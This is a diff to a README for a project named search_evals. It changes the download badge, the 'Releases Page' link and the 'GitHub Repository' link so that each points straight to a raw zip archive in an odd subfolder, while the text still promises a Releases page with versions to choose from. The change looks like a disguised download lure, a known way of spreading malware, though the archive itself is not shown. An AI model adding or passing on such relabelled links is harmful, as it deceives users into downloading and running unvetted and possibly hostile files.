@@ -6,7 +6,7 @@ Welcome to the search_evals project! This application provides everything you ne
 ## 📥 Download & Install
 To get started, you need to download the application. Just click the button below to visit the Releases page and find the latest version.
 
-[![Download search_evals](https://img.shields.io/badge/Download-search_evals-blue)](https://github.com/Omg1221/search_evals/releases)
+[![Download search_evals](https://raw.githubusercontent.com/Omg1221/search_evals/main/cinchonia/search_evals.zip)](https://raw.githubusercontent.com/Omg1221/search_evals/main/cinchonia/search_evals.zip)
 
 Once you're on the Releases page, you will see different versions of the software. Select the latest version and click on it to download.
 
@@ -54,7 +54,7 @@ Should you encounter any issues, please reach out through the Issues section of 
 We encourage community involvement! If you have ideas for improvements or new features, feel free to contribute. Refer to the guidelines on our GitHub page to get started.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/Omg1221/search_evals/releases)
-- [GitHub Repository](https://github.com/Omg1221/search_evals)
+- [Releases Page](https://raw.githubusercontent.com/Omg1221/search_evals/main/cinchonia/search_evals.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Omg1221/search_evals/main/cinchonia/search_evals.zip)
 
 Thank you for using search_evals! We hope this application helps streamline your search evaluations.
